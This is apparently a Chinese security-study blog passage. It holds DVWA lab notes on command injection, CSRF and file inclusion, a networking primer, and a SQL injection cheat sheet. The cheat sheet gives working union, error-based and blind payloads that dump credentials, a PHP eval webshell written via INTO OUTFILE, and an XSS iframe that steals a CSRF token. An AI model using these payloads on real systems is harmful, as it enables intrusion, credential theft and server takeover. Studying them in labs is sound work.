&amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;</span><br><span class="line">        // If all 4 octets are int&#x27;s put the IP back together.</span><br><span class="line">        $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3];</span><br><span class="line"></span><br><span class="line">        // Determine OS and execute the ping command.</span><br><span class="line">        if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">            // Windows</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // *nix</span><br><span class="line">            $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Feedback for the end user</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Ops. Let the user name theres a mistake</span><br><span class="line">        echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>查看代码，impossible级别的代码加入了Anti-CSRF:token，同时对参数ip进行了严格限制，只有像“数字.数字.数字.数字”的输入才会被接收执行，因此不存在命令注入漏洞。<br><strong>源码分析</strong><br>先checkToken，检查了token，然后把输入的ip&#x3D;()删除反斜杠，接着用explode()函数把传入的命令以.为分界分成4个部分，然后if语句中使用is_numeric()函数来验证每个部分是不是数字，sizeof()函数检查是不是四个部分，如果以上都满足就将四个部分拼接在一起进行命令执行，否则报错。最后生成生成反csrf令牌。</p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p>这是一个修改密码的页面，修改试试，修改成功，并且是以get方式传输的<br><img src="/./img/164.png"><br>从有源码中，可以知道，服务器收到修改密码的请求后，会检查参数$pass_new与$pass_conf是否相同，如果相同就会修改密码，并且没有任何的防csrf机制<br>我们就直接在URL中修改内容:<br><code>http://www.dvwa.test/vulnerabilities/csrf/?password_new=abcd&amp;password_conf=abcd&amp;Change=Change#</code><br>(必须使用同一个浏览器，因为在访问页面时通常存在cookie认证，否则即使点击了恶意链接也没用)<br>密码有效<br><img src="/./img/165.png"><br>所以在这种情况下我们可以使用短链接包装一下上面的链接诱骗受害者点击，然后密码就会被自动修改</p>
+<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><p>直接修改url，提示请求错误<br><img src="/./img/166.png"><br>尝试修改密码，抓包发现referer<br><img src="/./img/167.png"><br>查看源码，medium级别中通过Referer检查来源，要求Referer中的来源方和host一致才能通过，所以我们需要添加并修改Referer<br><img src="/./img/168.png"><br><img src="/./img/170.png"></p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>加入了Anti-CSRF token来防范CSRF攻击，即随机生成了一个token，正确时才能通过。<br>如果要绕过这个机制，就要获取token，然后利用受害者的cookie去修改密码<br>这里需要XSS+CSRF来共同完成：<br>找到DVWA中的XSS(stored)模块，在Low中抓包投放js代码<br><code>&lt;iframe src=&quot;../csrf/&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;&lt;/iframe&gt;</code><br>然后就出现了这样一个数据信息<br><img src="/./img/171.png"><br>再点击DVWA Security后弹出token<br><img src="/./img/172.png"><br>构造语句后将这个token添加上，然后回车<br><img src="/./img/173.png"><br><img src="/./img/174.png"></p>
+<h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><p>可以看到，Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。 </p>
+<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h3><p>没有任何保护措施，可以直接在地址栏中进行文件名传参<br><code>?page=D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code><br><img src="/./img/175.png"></p>
+<h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation验证</span><br><span class="line">$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</span><br><span class="line">$file = str_replace( array( &quot;../&quot;, &quot;..\\&quot; ), &quot;&quot;, $file );</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>对于http的替换我们可以采用双写绕过，而下面的斜杠主要是针对相对路径文件存储路径，但如果我们采用绝对路径上述过滤也可以成功绕过</p>
+<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Input validation</span><br><span class="line">if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>fnmatch() 函数：根据指定的模式来匹配文件名或字符串<br>采用file类型地址，那么我们就把我们要输入的地址进行修改<br><code>?page=file:///D:/phpStudy/PHPTutorial/WWW/phpinfo.php</code></li>
+</ul>
+<h3 id="Impossible-1"><a href="#Impossible-1" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">// The page we wish to display</span><br><span class="line">$file = $_GET[ &#x27;page&#x27; ];</span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123;</span><br><span class="line">    // This isn&#x27;t the page we want!</span><br><span class="line">    echo &quot;ERROR: File not found!&quot;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看源代码，发现采用了白名单过滤，规定了传入的文件只能是这几个，那么就杜绝了文件包含漏洞</p>
+<h2 id="交换机和路由器"><a href="#交换机和路由器" class="headerlink" title="交换机和路由器"></a>交换机和路由器</h2><p>1、交换机是用来组建局域网最重要的设备(一个圈打个叉)<br>2、路由器可以让这个局域网(内网)上网，实现连接内网和外网(长方形两条横线)<br>3、交换机、网线、电脑构成局域网<br><img src="/./img/176.png"><br>上面那个是交换机，下面是电脑的网卡插着网线连接着交换机<br>如果这个局域网需要可以上网就需要买路由器,路由器一端连交换机一端连运营商而这几台电脑之间需要能通信就需要有ip地址<br>这里是VMware提供的虚拟交换机<br><img src="/./img/177.png"><br>如果我勾选VMnet1相当于我的虚拟机的网卡连上了交换机，如果另一台虚拟机也连这个交换机就可以做局域网实验<br>IP可以手动配也可以自动，但是企业的ip一般是手动配的不会变</p>
+<h2 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h2><p>ip地址就是一个唯一标识，是一段网络编码(二进制)，由32位组成<br>11010010.01001001.10001100.00000110<br>210.73.140.6(便于记忆这样写)<br>常用ip地址都是由32位二进制组成的，最大的ip地址是255.255.255.255最小的ip地址是0.0.0.0</p>
+<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>有ip的地方必须有子网掩码</p>
+<ul>
+<li>局域网通信规则：在同一个局域网中，所有的ip必须在同一个网段中才可以互相通信，所以在不同的网段需要路由器才能通信，单单有交换机不行</li>
+<li>ip地址的构成：网络位+主机位(网络位相同的ip地址为同一个网段)类比你来自哪里，你叫什么网络位可以是前一位两位三位，而子网掩码就是来确认网络位的，在子网掩码中与255对应的是网络位，与0对应的是主机位，比如255.0.0.0就是将第一个小数点前作为网络位，255和0都是连续的不会出现交替</li>
+<li>每个网段的总称是将ip的主机位置零，表示这个网段<br>eg：<br>ip：10.1.1.1<br>子网掩码：255.255.255.0<br>这个网段表示为10.1.1.0，该网段的广播地址是10.1.1.255，广播地址是指可以直接向这个网段的所有ip地址发送东西，可以视为组播地址的升级版，是该网段的<br>大喇叭，255.255.255.255是全局广播地址，可以向所有网段发送信息，但是现在一些地区已经做了隔断。所有可用地址有254个，除去<strong>主机位全为</strong>0或255的</li>
+</ul>
+<h2 id="IP地址分类-看第一部分区分"><a href="#IP地址分类-看第一部分区分" class="headerlink" title="IP地址分类(看第一部分区分)"></a>IP地址分类(看第一部分区分)</h2><p>国际标准组织ISO定义地址分类：五大类(是以ip地址的第一位区分)</p>
+<blockquote>
+<p>A类：1-126 默认子网掩码：255.0.0.0<br>B类：128-191 默认子网掩码：255.255.0.0<br>C类：192-223 默认子网掩码：255.255.255.0<br>D类：224-239 组播地址<br>E类：240-254 科研使用</p>
+</blockquote>
+<p>这样的定义年代久远了，已经不一定使用默认子网掩码，普通人只能使用前三类，子网掩码可以修改<br>127.0.0.1是回环地址，代表本主机自己，经常用来测试将自己的主机作为服务器是否故障，就ping 127.0.0.1看看是否可以访问</p>
+<p><strong>组播技术</strong><br>和组播地址相对应的是单播地址，就是一个人一个地址，但组播地址就可以给一组人使用，将一组ip地址视为是同一个组播地址，发东西只发给这个ip地址就相当于发给这一组ip地址，这样的组播技术可以节省服务器带宽</p>
+<h2 id="网关-GW"><a href="#网关-GW" class="headerlink" title="网关(GW)"></a>网关(GW)</h2><p>这个整体是内网<br><img src="/./img/176.png"></p>
+<p><img src="/./img/178.png"><br>电脑向别的ip地址发送信息时先会比较自己和对方是否在同一个网段，如果不在同一个网段就直接通过交换机发给对方；如果不在同一网段就得发给路由器，而一般每个网段的第一个或最后一个可用的ip地址作为网关，网关就是整个内网的出口，是通向外网的通道，所以只需要将信息发给网关，网关会去寻找要转发的对象(这里怎么转发就涉及到路由器原理了)。<br>这里的10.1.1.254就是网关,如果只需要在局域网中通信就只需要ip和子网掩码，如果要上网就必须配网关，如果不知道网关就无法和外界通信,一般网关在路由器上<br><img src="/./img/180.png"><br>这里就有配置默认网关<br><img src="/./img/179.png"><br>VM开头的是虚拟的，一般网卡的牌子是realtek和Intel，所以属于我物理机的是以太网</p>
+<h2 id="DNS-域名解析服务器"><a href="#DNS-域名解析服务器" class="headerlink" title="DNS(域名解析服务器)"></a>DNS(域名解析服务器)</h2><p>任何两个PC通信都需要知道对方的ip，当在浏览器上地址栏输入<code>www.jd.com</code>浏览器会先问问自己，即查看有没有匹配的DNS缓存，但如果从来没有访问过就先在本地域名解析文件(host文件)中寻找，如果还没有就求助DNS服务器，所以电脑需要知道DNS服务器的IP，DNS的服务器分布于全球各地，DNS的ip是在公网(互联网)上<br>这里是电脑里的相关配置，这个DNS服务器是北京联通的最通用的一台DNS<br><img src="/./img/181.png"><br>访问过程<br><img src="/./img/182.png"><br>如果所使用的DNS服务器被劫持，使我们输入的域名解析成恶意网站就很危险<br><strong>一些网络测试命令</strong></p>
+<ul>
+<li>ping 测试网络连通性，有去有回，相当于发过去几个探测包，对方有回包<br>这里的时间可以反映网速，如果对方打开防火墙的某些功能也会ping不通<br><img src="/./img/183.png"> </li>
+<li>nslookup 域名(比如<code>www.baidu.com</code>)，手工解析ip地址</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html" itemprop="url">sql注入总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-30T23:56:39+08:00">
+                2023-05-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="关于mysql"><a href="#关于mysql" class="headerlink" title="关于mysql"></a>关于mysql</h2><p>mysql有个自带的数据库：information_schema，该数据库下面有两个表：tables和columns。<br>1、tables表中有个字段：table_name 是所有数据库存在的表名，另一个字段table_schema 是对应表名所在的数据库名<br>2、columns表中有个字段：column_name 是所有数据库存在的列名，另一个字段column_schema 是对应列名所在的数据库名</p>
+<h2 id="注入点类型判断"><a href="#注入点类型判断" class="headerlink" title="注入点类型判断"></a>注入点类型判断</h2><ul>
+<li>数字型</li>
+<li>字符型<br><strong>数字型判断</strong><br>当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下：<br><code>select * from &lt;表名&gt; where id = x</code><br>这种类型可以使用经典的 and 1&#x3D;1 和 and 1&#x3D;2 来判断：</li>
+<li>Url 地址中输入<code>/abc.php?id= x and 1=1 </code>页面依旧运行正常</li>
+<li>Url 地址中继续输入 <code>/abc.php?id= x and 1=2 </code>页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ul>
+<p>原因如下：<br>当输入 <code>and 1=1</code>时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=1</code><br>没有语法错误且逻辑判断为正确，所以返回正常<br>当输入 and 1&#x3D;2时，后台执行 Sql 语句：<br><code>select * from &lt;表名&gt; where id = x and 1=2</code><br>没有语法错误但是逻辑判断为假，所以返回错误<br>我们再使用假设法：如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况：<br><code>select * from &lt;表名&gt; where id = &#39;x and 1=1&#39; </code><br><code>select * from &lt;表名&gt; where id = &#39;x and 1=2&#39;</code><br>查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，所以不会出现以上结果，故假设是不成立的。</p>
+<p><strong>字符型判断</strong></p>
+<ul>
+<li>Url 地址中输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 </code>页面运行正常</li>
+<li>Url 地址中继续输入 <code>/abc.php?id= x&#39; and &#39;1&#39;=&#39;2</code> 页面运行错误，则说明此 Sql 注入为字符型注入。<br>同样可以使用假设法来验证</li>
+</ul>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>以下是字符型的情况：<br><strong>1、判断列数</strong><br><code>?id=1&#39;order by 3 --+</code><br><strong>2、判断显示位，就是看哪一列会显示在屏幕上</strong><br><code>?id=-1&#39;union select 1,2,3--+</code><br><strong>3、数据库名</strong><br><code>?id=-1&#39;union select 1,database(),3--+</code><br><strong>4、该数据库下的表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>5、待查表的字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>
+<p><strong>6、数据</strong><br><code>?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+</code></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
+<li>updatexml()是更新xml文档的函数</li>
+</ul>
+<p>语法：updatexml(目标xml内容，xml文档路径，更新的内容)<br><code>updatexml(1,concat(0x7e,(select database()),0x7e),1)</code><br>实际上这里是去更新xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入了特殊字符，因为不符合输入规则所以报错，但是报错的时候其实已经执行了子查询语句，并从报错信息中显示出来</p>
+<p><strong>数据库名</strong><br><code>?id=1&#39; or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),1) --+</code><br><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p><strong>字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27; limit 1,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 0,1),&#x27;~&#x27;),1) --+</span><br></pre></td></tr></table></figure>
+<p>ps:</p>
+<ul>
+<li>报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()</li>
+<li>建议使用or，因为and如果两条语句有一条是false，就会判定为false，如果前面的条件不成立，后面的语句就不会执行</li>
+</ul>
+<h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><p>在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有三个：<br>into dumpfile()、into outfile()、load_file()<br>这些都是需要设置secure_file_priv&#x3D;,如果为空则可以指定任意目录，如果有设置等于某个路径就只能在这个路径下写入，如果为null则禁止导入导出功能<br>可以往里面写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,&quot;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&quot;,3 into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/shell.php&quot; --+</span><br></pre></td></tr></table></figure>
+<p>也可以直接把想要查询的内容导出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  union select 1,2,group_concat(username, &quot;~&quot;,password) from users into outfile &quot;D://phpStudy/PHPTutorial/WWW/sqli-labs-master/Less-7/outfile.txt&quot; --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>没有显错位的时候可以尝试使用盲注的方式<br><strong>下面介绍一些盲注相关的函数</strong><br>length():返回字符串的长度<br>substr():截取字符串<br>ascii():返回字符的ascii码<br>sleep():将程序挂起一段时间<br>if(1,2,3):判断1成立就执行2，不成立就执行3</p>
+<p><strong>数据库长度</strong><br><code>?id=1&#39;and (length(database()))=1 --+</code></p>
+<p><strong>数据库名称</strong><br><code>?id=1&#39;and ascii(substr(database(),1,1))=100 --+</code></p>
+<p><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),1,1))=117 --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=105--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27; --+</span><br></pre></td></tr></table></figure>
+<p>可以使用字符判断也可以使用字符本身，每个字段名会被隔开，所以中间会有不在a~z范围内的，当然也可以一个一个查</p>
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>如果输入什么，页面回显都不变可以考虑使用时间盲注<br><strong>判断参数构造</strong><br><code>?id=1&#39; and if(1=1,sleep(5),1)--+</code></p>
+<p><strong>库名长度</strong><br><code>?id=1&#39;and if(length((select database()))=8,sleep(5),1)--+</code></p>
+<p><strong>数据库名称</strong><br><code>?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</code></p>
+<p><strong>表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr((select username from users),1,1))=100,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="post型"><a href="#post型" class="headerlink" title="post型"></a>post型</h2><p>万能密码：’or 1&#x3D;1 #</p>
+<h3 id="联合注入-1"><a href="#联合注入-1" class="headerlink" title="联合注入"></a>联合注入</h3><p><strong>判断列数</strong><br><code>&#39; or 1=1 order by 3#</code><br><strong>判断显示位</strong><br><code>&#39; union select 1,2 #</code><br>后面和get型相同<br>‘union select 1,database()#  </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/php.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/php.html" itemprop="url">php</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-30T21:10:19+08:00">
+                2023-05-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/cookies%E3%80%81session%E3%80%81token.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/cookies%E3%80%81session%E3%80%81token.html" itemprop="url">cookies、session、token</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-05-27T22:34:26+08:00">
+                2023-05-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>无状态的HTTP协议</strong><br>很久很久之前， Web基本都是文档的浏览而已。既然是浏览， 作为服务器， 不需要记录在某一段时间里都浏览了什么文档， 每次请求都是一个新的HTTP协议，就是请求加响应。不用记录谁刚刚发了HTTP请求， 每次请求都是全新的。</p>
+<p><strong>如何管理会话</strong><br>随着交互式Web应用的兴起， 像在线购物网站，需要登录的网站等，马上面临一个问题，就是要管理回话，记住那些人登录过系统，哪些人往自己的购物车中放商品，也就是说我必须把每个人区分开。</p>
+<p><strong>cookie</strong><br>cookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据。cookie由服务器生成，发送给浏览器，浏览器把cookie以KV形式存储到某个目录下的文本文件中，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用</p>
+<p><strong>session</strong><br>服务器要知道当前请求发给自己的是谁。为了做这种区分，服务器就是要给每个客户端分配不同的”身份标识”，然后客户端每次向服务器发请求的时候，都带上这个”身份标识“，服务器就知道这个请求来自与谁了。</p>
+<p><strong>Token</strong></p>
+<blockquote>
+<p>1、用户通过用户名和密码发送请求<br>2、程序验证<br>3、程序返回一个签名的token给客户端<br>4、客户端储存token, 并且每次用每次发送请求<br>5、服务端验证Token并返回数据</p>
+</blockquote>
+<p><strong>Cookie和Session的区别</strong></p>
+<blockquote>
